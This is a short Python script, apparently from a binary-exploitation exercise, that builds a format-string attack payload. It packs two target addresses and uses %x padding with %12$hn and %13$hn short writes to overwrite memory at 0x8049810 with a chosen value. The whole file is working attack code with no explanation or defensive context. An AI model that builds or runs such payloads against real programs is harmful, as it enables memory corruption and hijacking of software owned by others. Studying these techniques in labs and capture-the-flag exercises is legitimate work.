import struct

LOB_addr = 0x8049810
HOB_addr = 0x8049812

LOB = 0x5544
HOB = 0x0102

A1 = struct.pack("<I", LOB_addr)
A2 = struct.pack("<I", HOB_addr)

payload = A1 + A2
written = len(payload)

pad1 = LOB - written
payload += ("%{}x".format(pad1)).encode()
payload += "%12$hn".encode()

written = LOB
pad2 = (HOB - written) & 0xffff
payload += ("%{}x".format(pad2)).encode()
payload += "%13$hn".encode()

print(payload)

